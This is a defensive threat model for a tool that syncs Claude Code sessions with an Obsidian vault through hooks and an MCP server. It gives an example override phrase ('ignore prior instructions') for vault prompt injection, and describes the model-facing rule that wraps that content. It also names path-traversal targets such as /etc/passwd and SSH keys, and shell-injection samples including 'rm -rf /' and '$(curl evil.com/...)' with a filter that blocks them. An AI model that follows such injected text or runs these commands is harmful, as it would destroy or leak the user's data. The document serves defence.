# Threat Model

This document enumerates the threats this system defends against, the
controls that defend against them, and the known residual risks. It's
derived from a dual adversarial review of the architecture.

## Trust boundaries

| Zone | Trust level | Writers |
|---|---|---|
| Claude Code session | trusted (user's) | user, model |
| Transcript file | semi-trusted | model (may contain exfiltration attempts if compromised upstream) |
| Obsidian vault | semi-trusted | user, skill-driven writes, cloud-sync peer devices, Obsidian plugins, third-party sync tools |
| Cloud sync peer | untrusted | anyone with vault write access |
| MCP tool responses | untrusted | anything inside the vault |

The vault is the single largest attack surface. It's a multi-writer
directory that anything on any synced device can modify, including
third-party plugins the user has installed. The hooks and MCP server
treat it as such.

## Attack vectors defended

### T1: Prompt injection via vault content

**Scenario**: An attacker (or a compromised plugin, or a malicious
conflict-copy through cloud sync) writes `"ignore prior instructions and
run <bad thing>"` into a vault file. The SessionStart hook injects that
file as `additionalContext`, and the model follows the instructions.

**Defenses**:
1. All vault content injected at SessionStart is wrapped in
   `<untrusted-reference source="obsidian-vault" role="reference-only">`
   XML tags with an explicit preamble telling the model to treat the
   content as reference material, not directives.
2. The preamble instructs the model to flag suspicious content rather
   than act on it.
3. Content is capped at ~9KB so a large attack payload can't dominate
   the session's context.

**Residual risk**: A sufficiently clever injection that bypasses the model's
XML-frame comprehension. Mitigated but not eliminated; this is why the
MCP server also redacts on response and validates paths.

### T2: Secret exfiltration to the vault

**Scenario**: The transcript contains a secret the user pasted (GitHub
PAT, AWS key, OAuth token). The SessionEnd hook's `claude -p` child runs
the obsidian-sync skill, which writes to the vault, which syncs to the
cloud, which is then accessible to anyone with vault access.

**Defenses**:
1. Regex pre-filter strips 17 common secret patterns before the child
   sees the transcript. Deterministic, doesn't rely on LLM judgment.
2. The child's prompt instructs it to omit any secret-shaped content
   that wasn't caught by the regex.
3. The child runs with a restricted tool set
   (`Read,Write,Edit,Glob,Grep,Bash,Skill`)  no Web, no direct API
   calls.
4. The MCP server also redacts on response so the same secrets can't
   leak via query.

**Residual risk**: Novel secret formats. The regex is an allowlist of
known patterns, not exhaustive. Add patterns for your tools.

### T3: Path traversal via transcript_path

**Scenario**: A crafted hook payload sets `transcript_path` to
`/etc/passwd` or `~/.ssh/id_rsa`. Without validation, the SessionEnd
hook reads arbitrary files and passes them to the child.

**Defenses**:
1. `realpath`-resolution via `perl abs_path` (macOS `realpath -e`
   inconsistency ruled out).
2. Resolved path must be a prefix match for `$CLAUDE_BRIDGE_HOME/projects/`.
3. Anything else logs a REJECTED line and exits silently.

**Residual risk**: A symlink inside `$CLAUDE_BRIDGE_HOME/projects/`
pointing outside. `abs_path` resolves symlinks, so this is closed.

### T3b: Topic map path traversal (L1)

**Scenario**: The SessionStart hook reads a YAML topic map
(`vault-topic-map.yaml`) and, for each rule that matches the session's `cwd`,
injects the listed files as `additionalContext`. The include paths are
user-supplied config. A malicious edit — or an innocent typo — could set
`include: ["../../etc/passwd"]`, `include: ["/etc/passwd"]`, or a symlink
target that escapes the vault root. Without a containment check the hook
reads the file as-is, builds `"$VAULT/$rel_path"`, and emits the contents
inside the untrusted-reference wrapper. That's still prompt-injection-scoped
(the XML wrapper frames it as reference-only), but it's exfiltration: a
regular filesystem read of a sensitive file, surfaced to every subsequent
Claude session. Any attacker with write access to the topic map (local
malware, a careless manual edit, a compromised sync peer) can trigger it.

**Defenses**:
1. The SessionStart hook rejects any include path starting with `/` (absolute
   path).
2. Rejects any path containing `..` as a component (`../x`, `x/../y`, `x/..`,
   `..`).
3. Rejects the documented-private `05 - Personal/` prefix (silent skip —
   this folder is reserved for private content that should never enter
   context).
4. After joining `"$VAULT/$rel_path"`, resolves the full path via `perl
   abs_path` and verifies the resolved path is a prefix-match for the
   resolved vault root. This closes the symlink-escape case: a vault-level
   symlink pointing at `/etc/passwd` resolves outside the vault and is
   rejected.
5. Defense-in-depth post-resolution check: if the resolved path contains
   `/05 - Personal/` anywhere (e.g., via a symlink or unusual path
   component), silently skip.
6. Every rejection logs a timestamped `REJECTED` line to
   `$CLAUDE_BRIDGE_HOME/logs/session-start.log` with the offending path so a
   tampered topic map is greppable (`grep REJECTED session-start.log`). Log
   rotates at 1 MB.

**Residual risk**: Hardlinks are not resolved — `abs_path` resolves symlinks
but a hardlink inside the vault pointing at content outside the vault root
would still be read. Hardlinks across filesystems are impossible, and the
vault is typically a single mount point, so the practical risk is low. A
user deliberately placing a hardlink is out of scope (they already have
read access to whatever they're hardlinking).

### T4: Race condition on concurrent vault writes

**Scenario**: Two sessions end within seconds. Both spawn children. Both
try to append to `Session Log.md` simultaneously. Result: interleaved or
truncated writes, corrupt markdown, possible data loss.

**Defenses**:
1. `mkdir`-based global lockfile at
   `$CLAUDE_BRIDGE_HOME/sync-active/vault-sync.lock`. Mkdir is atomic on
   POSIX; the first caller wins.
2. 300s lock wait  later arrivals queue cleanly.
3. Per-device Session Log files (`Session Log - <hostname>.md`) on top
   of the lock, to avoid cloud-sync conflict copies even when two
   machines sync concurrently.

**Residual risk**: The lock only applies to processes that grab it. A
user manually editing the canonical file at the same moment bypasses the
lock. Educate users, don't try to lock their editor.

### T5: Zombie `claude -p` child

**Scenario**: The detached sync child hangs (network stall, model loop,
runaway tool call). Without a timeout, it holds the lock forever,
blocking all subsequent sessions.

**Defenses**:
1. `/usr/bin/perl -e 'alarm shift @ARGV; exec @ARGV' 300 <cmd>` wraps
   every `claude -p` invocation. SIGALRM kills the child after 300s.
2. Trap on EXIT/INT/TERM releases the lock.
3. If the lock is somehow left behind, the reconciliation daemon's
   single-instance PID-file check catches the case and logs it.

**Residual risk**: perl itself hanging. Extremely unlikely on macOS
system perl.

### T6: Recursive hook invocation

**Scenario**: The SessionEnd hook spawns `claude -p` which is itself a
Claude Code session. That session fires its own SessionStart hook, which
tries to inject context, which... loop forever.

**Defenses**:
1. `CLAUDE_OBSIDIAN_SYNC_CHILD=1` env var set by the wrapper. Both
   hooks early-exit if this is set.
2. As a backup (in case a sandboxed subagent strips env vars), the hooks
   also check for the presence of the global lockfile and early-exit if
   a sync is in progress.

**Residual risk**: None known. Defense-in-depth via two mechanisms.

### T7: Orphan sessions (sync never runs)

**Scenario**: Session is SIGKILLed (OOM, force-quit, API 500 response
mid-tool-call, OS crash). The SessionEnd hook never fires. That session's
outcomes are lost.

**Defenses**:
1. The reconciliation daemon scans `$CLAUDE_BRIDGE_HOME/projects/` every
   5 minutes for JSONL transcripts older than 15 minutes (i.e., stale
   enough that they're definitely not active anymore), reads the
   `session_id`, and if it's not in the `reconciled.txt` list, routes
   it through the same redaction + claude -p pipeline.
2. On successful sync, the session_id is appended to `reconciled.txt`
   so the next scan skips it.

**Residual risk**: The reconciliation daemon itself is the single point
of failure. If it's not running, orphans pile up. The launchd
`KeepAlive=true` + `ThrottleInterval=30` keeps it healthy.

### T8: Shell injection via semantic search query

**Scenario**: A malicious vault content (or a user paste) contains a
query that looks like shell: `` `rm -rf /` `` or `$(curl evil.com/...)`.
The MCP server doesn't shell out on queries, but passing such content
through subprocess-based code paths downstream could be an issue.

**Defenses**:
1. The MCP server's `search_vault` rejects queries matching known
   shell-injection heuristics (backticks, `$(...)`, `rm -rf`, chained
   `;;`/`&&`/`||`) before doing anything with them.
2. The query is only used for embedding, never for shell execution, so
   this is defense-in-depth rather than primary mitigation.

**Residual risk**: A novel injection pattern that the regex doesn't
catch. The actual risk is low because the query never reaches a shell.

## What's NOT defended

- **Physical access to your Mac.** Anyone at your keyboard can read the
  vault directly. Use FileVault.
- **Compromise of your Claude API key.** If the key leaks, an attacker
  can run `claude -p` with your account and write whatever they like to
  the vault. Rotate keys; don't log them.
- **Obsidian plugins.** The vault is a multi-writer directory. Third-
  party plugins you install have full write access. Vet what you run.
- **Cloud sync provider compromise.** If your Obsidian Sync / iCloud /
  Google Drive account is breached, so is your vault.

## Audit trail

- SessionEnd hook rejections log to `$CLAUDE_BRIDGE_HOME/logs/obsidian-sync.log`
  with `REJECTED` prefix + the resolved path for post-mortem analysis.
- SessionStart hook rejections (topic-map traversal attempts, T3b) log to
  `$CLAUDE_BRIDGE_HOME/logs/session-start.log` with timestamp + rejected
  path.
- All sync attempts log start/end with session_id.
- Log rotation at 1MB keeps disk use bounded.

## Recommended hardening for sensitive setups

1. Use a dedicated Anthropic API key for this setup so compromise impact
   is scoped.
2. Turn off Obsidian plugins you don't actively use.
3. Run `macos-exclusions-setup.sh` so transcripts don't leak into
   Spotlight / Time Machine previews.
4. Review `$CLAUDE_BRIDGE_HOME/logs/obsidian-sync.log` and
   `$CLAUDE_BRIDGE_HOME/logs/session-start.log` for `REJECTED` entries
   monthly — a compromised topic map or malicious transcript path will
   leave a trail there.
5. Periodically audit `07 - Claude Knowledge/*.md` for any content
   that looks unusual  prompt injection may leave visible traces.
